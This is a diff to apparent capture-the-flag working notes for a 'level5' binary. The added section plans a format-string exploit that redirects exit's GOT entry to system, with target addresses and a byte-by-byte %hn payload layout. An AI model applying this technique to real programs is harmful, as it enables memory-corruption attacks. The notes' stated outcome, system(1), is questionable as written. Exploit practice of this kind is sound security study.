@@ -63,6 +63,33 @@ Read `/home/user/level6/.pass` to get the level 6 password
 - Verify if exit redirection will work or if we need ROP/shellcode
 - Test exploit on remote level5 binary
 
-### Status: READY FOR EXPLOITATION
+### Exploitation Approach: GOT Overwrite with %hn Writes
 
-The format string vulnerability is clear. Need to determine the best exploitation path.
+**Strategy**: Overwrite the GOT entry for `exit` to point to `system` instead
+
+**Addresses**:
+- exit@got: 0x08049838
+- system@plt: 0x08048370
+
+**Implementation**:
+1. Use two %hn (2-byte) writes to overwrite exit@got
+2. Write upper 2 bytes (0x0804) to 0x0804983a (2052 decimal)
+3. Write lower 2 bytes (0x8370) to 0x08049838 (33648 decimal)
+4. Must write in order: 2052 first, then 33648 (character count only increases)
+
+**Payload Structure**:
+```
+[4 bytes: address 0x0804983a]     # Target for upper word write
+[4 bytes: address 0x08049838]     # Target for lower word write
+[2044 bytes: 'A' padding]         # Total: 2052 bytes printed
+[6 bytes: '%13$hn']               # Write 0x0804 (2052) to 0x0804983a
+[31596 bytes: 'B' padding]        # Total: 33648 bytes printed
+[6 bytes: '%12$hn']               # Write 0x8370 (33648) to 0x08049838
+[Total: ~33,658 bytes]
+```
+
+**Result**: When the program calls `exit(1)`, it executes `system(1)` instead
+
+### Status: EXPLOITATION IN PROGRESS
+
+GOT overwrite payload implemented and ready for testing.
